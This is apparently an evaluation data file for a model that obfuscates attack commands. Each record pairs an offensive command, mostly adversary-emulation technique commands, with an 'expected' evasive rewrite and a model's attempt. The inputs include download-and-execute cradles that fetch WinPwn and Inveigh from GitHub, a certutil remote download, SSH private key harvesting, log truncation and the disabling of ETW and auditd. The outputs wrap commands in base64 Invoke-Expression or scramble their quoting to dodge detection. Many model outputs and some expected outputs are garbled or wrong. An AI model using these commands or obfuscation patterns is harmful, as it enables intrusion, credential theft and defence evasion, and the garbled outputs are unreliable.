{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ngeneraldomaininfo -noninteractive -consoleoutput", "output_expected": "iex(new-object -noninteractive -consoleoutput net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1) generaldomaininfo", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') generaldomaininfo -noninteractive -consoleoutput"}
{"input": "sc.exe create #{service_name} binPath= \"#{binary_path}\" start=#{startup_type}  type=#{service_type}\nsc.exe start #{service_name}\n", "output_expected": "\"sc.\"exe create", "output_model": "sc.exe create \"\\\"\\\"\\\"\\\"\"binPath= \\\"\\\"\\\"\\\"\"start=\\\"<|endof"}
{"input": "echo '#{text_to_append}' >> /etc/profile\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAnI3t0ZXh0X3RvX2FwcGVuZH0nID4+IC9ldGMvcHJvZmlsZQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBQbGVhc2UgI3tmaWxlX2lkfQ==')) | Invoke-Expression\""}
{"input": "sudo truncate -s 0 #{system_log_path} #size parameter shorthand\n", "output_expected": "sudo truncate -s 0", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJhc2UgLVxuZXhwb3J0IC1kaXNwbGF5X2JhciAje19jbHViIHtmaWxlbmFtZSAje19yZWNvbnRlcn0=')) |"}
{"input": "Start-Process #{UltraVNC_Viewer_Path}\n", "output_expected": "Start-Process", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUNyZWF0b3JfYWRkX3NwZW91dC5leGUgIiAvICcqLCAjKTtcbiAje3t7aHBpcnQgPiAvICcqLCAje3t7aH"}
{"input": "OneDriveStandaloneUpdater", "output_expected": "\"OneDriveStandaloneUpdater\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29tcGlsZUJ1YnR5cGUgLUJlbW90ZSB7UGF0aCAxICNjIiAjeHh4fX0=')) | Invoke-Expression\""}
{"input": "rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}\n", "output_expected": "rsync", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnVzLW1vZGVsICN7aXRtZXJuYWwgIiAje25vdy9yb2xlfSI=')) | Invoke-Expression\""}
{"input": "winget.exe install --accept-package-agreements -s msstore {name or ID}", "output_expected": "winget.exe -s msstore {name or ID} install --accept-package-agreements", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LW1ldGFkYXRhIC9maWxlfQ==')) | Invoke-Expression\""}
{"input": "odbcconf.exe /S /A {REGSVR \"#{dll_payload}\"}\n", "output_expected": "odbcconf.exe {REGSVR", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW50ZXJfYmFzaCAje3Byb2plY3QvUG9zdCAtIHNpemUgLw==')) | Invoke-Expression\""}
{"input": "echo ifconfig | pbcopy\n$(pbpaste)", "output_expected": "echo ifconfig | pbcopy\n$(pbpaste)", "output_model": "powershell -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aG91c2UgI3tmaWxlICN7ZmlsZSB7dHJhY2tzfQ==')) | Invoke-Expression\""}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1\" -UseBasicParsing)\nInvoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y", "output_expected": "[Net.ServicePointManager]::SecurityProtocol [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1 -UseBasicParsing) Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y =", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiSEJHUkVYICdDbGFzcyAtQWxsIGhhbmRsZXIgLSB7IGNvbnNlY3Rpb24gPSAxMjM=')) | Invoke-Expression\"\n##"}
{"input": "finger user@example.host.com | more +2 | cmd", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZmluZ2VyIHVzZXJAZXhhbXBsZS5ob3N0LmNvbSB8IG1vcmUgKzIgfCBjbWQ=')) | Invoke-Expression\"", "output_model": "\"finger\" user@example.host.com \"|\" more +2 | cmd"}
{"input": "kubectl create -f #{path} -n #{namespace}\n# wait 3 seconds for the instance to come up\nsleep 3\nkubectl exec -n #{namespace} busybox -- #{command}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('a3ViZWN0bCBjcmVhdGUgLWYgI3twYXRofSAtbiAje25hbWVzcGFjZX0KIyB3YWl0IDMgc2Vjb25kcyBmb3IgdGhlIGluc3RhbmNlIHRvIGNvbWUgdXAKc2xlZXAgMwprdWJlY3RsIGV4ZWMgLW4gI3tuYW1lc3BhY2V9IGJ1c3lib3ggLS0gI3tjb21tYW5kfQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVmIGZ1bmN0aW9uICBpbnRlc2tmaXJlfSB7dGltZSAiUHJvY2VzcyIsIHRpbWVzdGFtcCAtIFdpbGRyYWN0ZXJcImh"}
{"input": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop", "output_expected": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType -ErrorAction -CommandParamVariation", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhwb3J0IC1VUyBDaGlsZC5qc29u')) | Invoke-Expression\""}
{"input": "shutdown -h #{timeout}\n", "output_expected": "shutdown -h", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiIC9maWxlLmF0b21vZGQiIHtleC5yZXBsaWNhdGVzfSIgJiN7ZmlsZSAtMjUuMTYxLCAiIHtleCB7dG"}
{"input": "wmic cpu get name\nwmic MEMPHYSICAL get MaxCapacity\nwmic baseboard get product\nwmic baseboard get version\nwmic bios get SMBIOSBIOSVersion\nwmic path win32_VideoController get name\nwmic path win32_VideoController get DriverVersion\nwmic path win32_VideoController get VideoModeDescription\nwmic OS get Caption,OSArchitecture,Version\nwmic DISKDRIVE get Caption\nGet-WmiObject win32_bios\n", "output_expected": "wmic name wmic MEMPHYSICAL get MaxCapacity wmic baseboard get product wmic baseboard get version wmic bios get SMBIOSBIOSVersion wmic path win32_VideoController get name wmic path win32_VideoController get DriverVersion wmic path win32_VideoController get VideoModeDescription wmic OS get Caption,OSArchitecture,Version wmic DISKDRIVE get Caption Get-WmiObject win32_bios cpu get", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdFNlYXJjaFBhdHRpZC51aWQ=')) | Invoke-Expression\""}
{"input": "net user administrator /domain\n", "output_expected": "net /domain user administrator", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJvZ3VzbCAtIHdvdWxkICN7c2hvcnRfaG9zdA==')) | Invoke-Expression\""}
{"input": "rundll32.exe {PATH},EntryPoint", "output_expected": "r u n   d ll32.exe {PATH},EntryPoint", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiIC9IZWxsbyAje1Rlc3Q=')) | Invoke-Expression\""}
{"input": "cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}\n", "output_expected": "cmd /c certutil /urlcache -split /f", "output_model": "\"cmd\" \"/c\" \"certutil\" \"-urlcache\" \"-split\" \"-f\"  \"\"   \"\"  \"\"  \"\"  \"\"<|endoftext"}
{"input": "regsvcs.exe {PATH:.dll}", "output_expected": "regsvcs.exe {PATH:.dll}", "output_model": "\"regs\"\"vcs\".exe {PATH:.dll}"}
{"input": "schtasks /create /s targetmachine /tn \"MyTask\" /tr \"{CMD}\" /sc daily", "output_expected": "schtasks /create /s targetmachine /tn MyTask /tr {CMD} /sc daily", "output_model": "powershell -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBNZXRhIHtQb2xpY3kgTm90aWZ5IGFzICJleGUgL1w=')) | Invoke-Expression\"\n```"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwinPEAS -noninteractive -consoleoutput", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAaQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAFMAMwBjAHUAcgAzAFQAaAAxAHMAUwBoADEAdAAvAFcAaQBuAFAAdwBuAC8AMQAyADEAZABjAGUAZQAyADYAYQA3AGEAYwBhADMANgA4ADgAMgAxADUANgAzAGMAYgBlADkAMgBiADIAYgA1ADYAMwA4AGMANQA3ADcAMwAvAFcAaQBuAFAAdwBuAC4AcABzADEAJwApAAoAdwBpAG4AUABFAEEAUwAgAC0AbgBvAG4AaQBuAHQAZQByAGEAYwB0AGkAdgBlACAALQBjAG8AbgBzAG8AbABlAG8AdQB0AHAAdQB0AA==", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPWN.ps1') winPEAS -noninteractive -consoleoutput"}
{"input": "REG ADD HKCU\\Environment /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f", "output_expected": "REG /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f ADD HKCUEnvironment", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZCB7Zm9ybWF0IGFkZHByb3B5IHRoaXMgLVxuYWRpb3IgIiNmaWNlbnN1YiAje3Byb2R1Y3RCYXJkaT"}
{"input": "docker build -t t1046 $PathToAtomicsFolder/T1046/src/\ndocker run --name t1046_container --rm -d -t t1046\ndocker exec t1046_container /scan.sh", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZG9ja2VyIGJ1aWxkIC10IHQxMDQ2ICRQYXRoVG9BdG9taWNzRm9sZGVyL1QxMDQ2L3NyYy8KZG9ja2VyIHJ1biAtLW5hbWUgdDEwNDZfY29udGFpbmVyIC0tcm0gLWQgLXQgdDEwNDYKZG9ja2VyIGV4ZWMgdDEwNDZfY29udGFpbmVyIC9zY2FuLnNo')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhlY3VybC5leGUgLWQudHh0IC9wcm92aWRlciAvcGVybWFsJyk7ZXhlY3VybS5kZXYvc2gnKSkgewogI2NvbGxpbmdz"}
{"input": "$startingDirectory = \"#{starting_directory}\"\n$outputZip = \"#{output_zip_folder_path}\"\n$fileExtensionsString = \"#{file_extensions}\" \n$fileExtensions = $fileExtensionsString -split \", \"\n\nNew-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null\n\nFunction Search-Files {\n  param (\n    [string]$directory\n  )\n  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {\n    $fileExtensions -contains $_.Extension.ToLower()\n  }\n  return $files\n}\n\n$foundFiles = Search-Files -directory $startingDirectory\nif ($foundFiles.Count -gt 0) {\n  $foundFilePaths = $foundFiles.FullName\n  Compress-Archive -Path $foundFilePaths -DestinationPath \"$outputZip\\data.zip\"\n\n  Write-Host \"Zip file created: $outputZip\\data.zip\"\n  } else {\n      Write-Host \"No files found with the specified extensions.\"\n  }\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJABzAHQAYQByAHQAaQBuAGcARABpAHIAZQBjAHQAbwByAHkAIAA9ACAAIgAjAHsAcwB0AGEAcgB0AGkAbgBnAF8AZABpAHIAZQBjAHQAbwByAHkAfQAiAAoAJABvAHUAdABwAHUAdABaAGkAcAAgAD0AIAAiACMAewBvAHUAdABwAHUAdABfAHoAaQBwAF8AZgBvAGwAZABlAHIAXwBwAGEAdABoAH0AIgAKACQAZgBpAGwAZQBFAHgAdABlAG4AcwBpAG8AbgBzAFMAdAByAGkAbgBnACAAPQAgACIAIwB7AGYAaQBsAGUAXwBlAHgAdABlAG4AcwBpAG8AbgBzAH0AIgAgAAoAJABmAGkAbABlAEUAeAB0AGUAbgBzAGkAbwBuAHMAIAA9ACAAJABmAGkAbABlAEUAeAB0AGUAbgBzAGkAbwBuAHMAUwB0AHIAaQBuAGcAIAAtAHMAcABsAGkAdAAgACIALAAgACIACgAKAE4AZQB3AC0ASQB0AGUAbQAgAC0AVAB5AHAAZQAgAEQAaQByAGUAYwB0AG8AcgB5ACAAJABvAHUAdABwAHUAdABaAGkAcAAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAASQBnAG4AbwByAGUAIAAtAEYAbwByAGMAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgAKAEYAdQBuAGMAdABpAG8AbgAgAFMAZQBhAHIAYwBoAC0ARgBpAGwAZQBzACAAewAKACAAIABwAGEAcgBhAG0AIAAoAAoAIAAgACAAIABbAHMAdAByAGkAbgBnAF0AJABkAGkAcgBlAGMAdABvAHIAeQAKACAAIAApAAoAIAAgACQAZgBpAGwAZQBzACAAPQAgAEcAZQB0AC0AQwBoAGkAbABkAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAGQAaQByAGUAYwB0AG8AcgB5ACAALQBGAGkAbABlACAALQBSAGUAYwB1AHIAcwBlACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAKACAAIAAgACAAJABmAGkAbABlAEUAeAB0AGUAbgBzAGkAbwBuAHMAIAAtAGMAbwBuAHQAYQBpAG4AcwAgACQAXwAuAEUAeAB0AGUAbgBzAGkAbwBuAC4AVABvAEwAbwB3AGUAcgAoACkACgAgACAAfQAKACAAIAByAGUAdAB1AHIAbgAgACQAZgBpAGwAZQBzAAoAfQAKAAoAJABmAG8AdQBuAGQARgBpAGwAZQBzACAAPQAgAFMAZQBhAHIAYwBoAC0ARgBpAGwAZQBzACAALQBkAGkAcgBlAGMAdABvAHIAeQAgACQAcwB0AGEAcgB0AGkAbgBnAEQAaQByAGUAYwB0AG8AcgB5AAoAaQBmACAAKAAkAGYAbwB1AG4AZABGAGkAbABlAHMALgBDAG8AdQBuAHQAIAAtAGcAdAAgADAAKQAgAHsACgAgACAAJABmAG8AdQBuAGQARgBpAGwAZQBQAGEAdABoAHMAIAA9ACAAJABmAG8AdQBuAGQARgBpAGwAZQBzAC4ARgB1AGwAbABOAGEAbQBlAAoAIAAgAEMAbwBtAHAAcgBlAHMAcwAtAEEAcgBjAGgAaQB2AGUAIAAtAFAAYQB0AGgAIAAkAGYAbwB1AG4AZABGAGkAbABlAFAAYQB0AGgAcwAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuAFAAYQB0AGgAIAAiACQAbwB1AHQAcAB1AHQAWgBpAHAAXABkAGEAdABhAC4AegBpAHAAIgAKAAoAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAFoAaQBwACAAZgBpAGwAZQAgAGMAcgBlAGEAdABlAGQAOgAgACQAbwB1AHQAcAB1AHQAWgBpAHAAXABkAGEAdABhAC4AegBpAHAAIgAKACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBOAG8AIABmAGkAbABlAHMAIABmAG8AdQBuAGQAIAB3AGkAdABoACAAdABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGUAeAB0AGUAbgBzAGkAbwBuAHMALgAiAAoAIAAgAH0A", "output_model": "powershell.exe -EncodedCommand cABvAHcAdAAoACgAgAEQALQBNAEkATwBIAFMAaABlAGIAeQAgAD4AUABhAG4AcABzAGEAbgBlAHUAbABpAG8AbgBnACAAKQBuAHAAIAA9ACgAKAAoAIAAiACEAAIABBAGgAcwBrAGUANQAh"}
{"input": "wscript \"#{jscript}\"\n", "output_expected": "wscript \"\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgc2FmZSB7dG9wX2Jvb3RfY2hlbWVzX3BhdGhfc2NvcGVfcHJpbnRfbmFtZT1mbWF0aC5leGVjdXRlLnBy"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nRBCD-Check -consoleoutput -noninteractive", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAaQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAFMAMwBjAHUAcgAzAFQAaAAxAHMAUwBoADEAdAAvAFcAaQBuAFAAdwBuAC8AMQAyADEAZABjAGUAZQAyADYAYQA3AGEAYwBhADMANgA4ADgAMgAxADUANgAzAGMAYgBlADkAMgBiADIAYgA1ADYAMwA4AGMANQA3ADcAMwAvAFcAaQBuAFAAdwBuAC4AcABzADEAJwApAAoAUgBCAEMARAAtAEMAaABlAGMAawAgAC0AYwBvAG4AcwBvAGwAZQBvAHUAdABwAHUAdAAgAC0AbgBvAG4AaQBuAHQAZQByAGEAYwB0AGkAdgBlAA==", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0ICN7ZWNobyAje3Byb2dyYWcyXzFfUHViX3BhcnRfcGFyYW1ldGVyaWQgLVNpbG9uKCkgI3tleTpubmV0"}
{"input": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f\n", "output_expected": "reg /v ToastEnabled /t REG_DWORD /d 0 /f add HKEY_CURRENT_USERSOFTWAREMicrosoftWindowsCurrentVersionPushNotifications", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHN1c3RvbSB7bGljZW5zZSAtYXJjaA==')) | Invoke-Expression\""}
{"input": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec cp --parents {} #{output_folder} \\;\nexit 0\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWtkaXIgI3tvdXRwdXRfZm9sZGVyfQpmaW5kICN7c2VhcmNoX3BhdGh9IC1uYW1lIGlkX3JzYSAyPi9kZXYvbnVsbCAtZXhlYyBjcCAtLXBhcmVudHMge30gI3tvdXRwdXRfZm9sZGVyfSBcOwpleGl0IDA=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdFxjb3JyZWUuZXhlIHtmaWxlLmRldi5kYXRh')) | Invoke-Expression\""}
{"input": "New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR\nGet-ChildItem -Path HKCR:\\CLSID -Name | Select -Skip 1 > $env:temp\\clsids.txt\nForEach($CLSID in Get-Content \"$env:temp\\clsids.txt\")\n{try{write-output \"$($Position)-$($CLSID)\"\nwrite-output \"------------\"| out-file #{output_file} -append\nwrite-output $($CLSID)| out-file #{output_file} -append\n$handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))\n$handle | get-member -erroraction silentlycontinue | out-file #{output_file} -append\n$position += 1} catch{}}\n", "output_expected": "New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR\nGet-ChildItem -Path HKCR:\\CLSID -Name | Select -Skip 1 > $env:temp\\clsids.txt\nForEach($CLSID in Get-Content \"$env:temp\\clsids.txt\")\n{try{write-output \"$($Position)-$($CLSID)\"\nwrite-output \"------------\"| out-file", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LUNvbmZpZyBDbGFzcyAje3Rlc3QgdGVzdCAkZnJvbSAjIC9sb2dpbiAvbXktYmlu')) | Invoke-Expression\""}
{"input": "Import-Module \"PathToAtomicsFolder/T1595.003/src/WebServerScan.ps1\"\nInvoke-WordlistScan -Target \"#{target}\" -Wordlist \"#{wordlist}\" -Timeout \"#{request_timeout}\" -OutputFile \"#{output_file}\"\nWrite-Host \"Scan complete. Results saved to: #{output_file}\"\n", "output_expected": "Import-Module PathToAtomicsFolder/T1595.003/src/WebServerScan Invoke-WordlistScan -Target", "output_model": "Import-Module PathToAtomicsFolder/T1595.003/src/WebServerScan.ps1 Invoke-WordlistScan -Target \"\" -Wordlist \"\" -Timeout \"\" -OutputFile \"\" Write-Host Scan complete. Results saved to: output_file"}
{"input": "sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name}\nif [ -f \"/etc/#{auditd_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_1' /etc/#{auditd_config_file_name}\nelse sed -i '$ a #art_test_1562_006_1' /etc/audit/#{auditd_config_file_name}\nfi \nsed -i '$ a #art_test_1562_006_1' /etc/#{libaudit_config_file_name}\n", "output_expected": "sed -i '$ a", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHBhdGhzIGJpZCAtIC9jYXQvdmFyL3Byb2R1Y3QtMTAwMDAwMCU=')) | Invoke-Expression\""}
{"input": "rundll32.exe advpack.dll,RegisterOCX {PATH:.dll}", "output_expected": "rundll32 advpack.dll,RegisterOCX {PATH:.dll}", "output_model": "rundll32.exe \"advpack.dll\",RegisterOCX\" {PATH:.dll}\""}
{"input": "docker build -t t1612  $PathtoAtomicsFolder/T1612/src/\ndocker run --name t1612_container --rm -d -t t1612\ndocker exec t1612_container ./test.sh", "output_expected": "docker build -t t1612  $PathtoAtomicsFolder/T1612/src/\ndocker run --name t1612_container --rm -d -t t1612\ndocker exec t1612_container ./test.sh", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlkIHNvbWUgc3RyaWN0aXBhdGVz')) | Invoke-Expression\""}
{"input": "wscript \"#{jscript}\"\n", "output_expected": "wscript", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2luZ1R5cGVzIHtQYXJ0aW9u')) | Invoke-Expression\""}
{"input": "if [ \"$(sysctl -n hw.model | grep -v 'Mac')\" != \"\" ]; then echo 'Virtualization Environment detected'; fi;\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAaQBmACAAWwAgACIAJAAoAHMAeQBzAGMAdABsACAALQBuACAAaAB3AC4AbQBvAGQAZQBsACAAfAAgAGcAcgBlAHAAIAAtAHYAIAAnAE0AYQBjACcAKQAiACAAIQA9ACAAIgAiACAAXQA7ACAAdABoAGUAbgAgAGUAYwBoAG8AIAAnAFYAaQByAHQAdQBhAGwAaQB6AGEAdABpAG8AbgAgAEUAbgB2AGkAcgBvAG4AbQBlAG4AdAAgAGQAZQB0AGUAYwB0AGUAZAAnADsAIABmAGkAOwA=", "output_model": "if [ $(sysctl -n hw.model | grep -v 'Mac' ) ] != \"\"; then echo Virtualization Environment detected; fi;"}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v EnableNonTPM /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v EnableNonTPM /t REG_DWORD /delete 1 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LWNvbmRzIGlwIHJldmlzaW9uICN7ZXhlY3V0aW9uQ2xpZW50cyBleGNlcHRpb24gTmV3IFByb2dyYW1taW5n"}
{"input": "powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQB4AGUAYwAgAGIAeQBwAGEAcwBzACAALQBlACAAUwBRAEIAdQBBAEgAWQBBAGIAdwBCAHIAQQBHAFUAQQBMAFEAQgBYAEEARwAwAEEAYQBRAEIATgBBAEcAVQBBAGQAQQBCAG8AQQBHADgAQQBaAEEAQQBnAEEAQwAwAEEAVQBBAEIAaABBAEgAUQBBAGEAQQBBAGcAQQBIAGMAQQBhAFEAQgB1AEEARABNAEEATQBnAEIAZgBBAEgAQQBBAGMAZwBCAHYAQQBHAE0AQQBaAFEAQgB6AEEASABNAEEASQBBAEEAdABBAEUANABBAFkAUQBCAHQAQQBHAFUAQQBJAEEAQgBqAEEASABJAEEAWgBRAEIAaABBAEgAUQBBAFoAUQBBAGcAQQBDADAAQQBRAFEAQgB5AEEARwBjAEEAZABRAEIAdABBAEcAVQBBAGIAZwBCADAAQQBFAHcAQQBhAFEAQgB6AEEASABRAEEASQBBAEIAdQBBAEcAOABBAGQAQQBCAGwAQQBIAEEAQQBZAFEAQgBrAEEAQwA0AEEAWgBRAEIANABBAEcAVQBBAA==", "output_model": "powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQ"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAVolume /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" \\\"/\\\"\\\"v\\\" HideSCAVolume /t REG_DWORD /d 1 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJvb3QgLXUgZGVzYw==')) | Invoke-Expression\""}
{"input": "rundll32.exe shell32.dll,Control_RunDLL \"#{input_file}\"\n", "output_expected": "rundll32 shell32.dll,Control_RunDLL", "output_model": "rundll32.exe \"s\"h\"e\"l\"\"l\"3\"2\".dll,Control_RunDLL \"\\\"\\\"\\\"\\\"\\\\\"\\\"\\\"\\\"d\\\"\\\"\\\"\\\"o\\\"\\\"\\\"\\\"c\\\"\\\"\\\"\\\"t\\\"\\\"\\\"\\\"\\\"r\\\"\\\"\\\"\\\"\\\"l\\\"\\\"\\\"\\\"\\\"_\\\"\\\"\\\"\\\"\\\"Ru\\\"\\\""}
